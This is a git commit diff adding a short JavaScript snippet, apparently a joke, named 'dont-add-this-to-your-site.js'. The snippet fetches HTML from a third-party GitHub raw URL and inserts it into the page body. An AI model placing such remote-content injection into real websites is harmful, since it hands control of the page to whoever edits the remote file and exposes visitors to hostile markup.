0082ee956c5e2dd824fe8ed0f948329228806729
ninjaboy999096 <129236203+ninjaboy999096@users.noreply.github.com>
2025-05-06 16:20:34 -0700

    Update dont-add-this-to-your-site.js

--- dont-add-this-to-your-site.js
+++ dont-add-this-to-your-site.js
@@ -1,1 +1,5 @@
-
+fetch("https://raw.githubusercontent.com/ninjaboy999096/totaly-trustable-thing-you-should-add-this-to-your-websim-site-we-will-not-mess-up-your-site/refs/heads/main/untrustible-file.html")
+  .then(res => res.text())
+  .then(html => {
+    document.body.insertAdjacentHTML("beforeend", html);
+  });
